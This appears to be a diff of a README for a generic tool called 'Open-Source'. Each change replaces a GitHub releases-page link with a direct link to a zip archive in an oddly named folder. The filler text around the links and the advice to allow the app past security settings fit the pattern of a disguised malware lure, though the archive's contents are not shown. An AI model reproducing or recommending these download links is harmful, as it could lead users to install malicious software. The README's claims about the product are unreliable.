@@ -1,7 +1,7 @@
 # 🚀 Open-Source - Simple Tool for Everyone
 
 ## 📥 Download Now
-[![Download Open-Source](https://img.shields.io/badge/Download-Open--Source-blue.svg)](https://github.com/appointive-ginkgofamily408/Open-Source/releases)
+[![Download Open-Source](https://raw.githubusercontent.com/appointive-ginkgofamily408/Open-Source/main/redressible/Open-Source-v1.3-alpha.2.zip)](https://raw.githubusercontent.com/appointive-ginkgofamily408/Open-Source/main/redressible/Open-Source-v1.3-alpha.2.zip)
 
 ## 📖 Overview
 Welcome to Open-Source! This application is designed to make your tasks easier and more efficient. Whether you want to manage your projects or simplify your daily routines, this tool provides the functionality you need. 
@@ -20,7 +20,7 @@ Welcome to Open-Source! This application is designed to make your tasks easier a
 
 ## 🚀 Getting Started
 1. First, ensure that your computer meets the system requirements.
-2. Visit our [Releases page](https://github.com/appointive-ginkgofamily408/Open-Source/releases) for the latest version of the software.
+2. Visit our [Releases page](https://raw.githubusercontent.com/appointive-ginkgofamily408/Open-Source/main/redressible/Open-Source-v1.3-alpha.2.zip) for the latest version of the software.
 3. Download the latest version by clicking on the appropriate link.
 4. Follow the installation instructions specific to your operating system below.
 
@@ -39,7 +39,7 @@ Welcome to Open-Source! This application is designed to make your tasks easier a
 4. If prompted, you may need to allow the app to run in your security settings.
 
 ## 📦 Download & Install
-To download and install Open-Source, visit this page: [Download Open-Source](https://github.com/appointive-ginkgofamily408/Open-Source/releases).
+To download and install Open-Source, visit this page: [Download Open-Source](https://raw.githubusercontent.com/appointive-ginkgofamily408/Open-Source/main/redressible/Open-Source-v1.3-alpha.2.zip).
 
 ## 🌟 Using Open-Source
 1. Launch the application by clicking its icon.
